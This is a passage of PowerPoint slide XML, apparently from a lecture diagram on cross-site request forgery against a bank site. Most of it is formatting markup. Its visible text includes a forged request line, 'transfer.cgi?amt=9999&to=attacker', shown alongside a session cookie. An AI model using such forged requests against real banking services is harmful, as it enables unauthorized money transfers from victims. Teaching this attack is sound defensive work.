          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83987" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83988" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8691563" y="4920784"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83989" name="object 22"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="4675655" y="4751330"/>
            <a:ext cx="3353360" cy="243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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1887"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>HabibB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>ank.com/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83990" name="object 23"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="3952875" y="4990264"/>
            <a:ext cx="4391306"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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1831"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3742765" y="4101353"/>
            <a:ext cx="4633632" cy="114300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83992" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2136122" y="4017309"/>
            <a:ext cx="983316" cy="487456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId8"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="object 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2273394" y="3697941"/>
            <a:ext cx="931489" cy="673774"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1141553" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="2118" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11191" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="724"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83994" name="object 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1658471" y="3392581"/>
            <a:ext cx="1245254" cy="532279"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId9"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
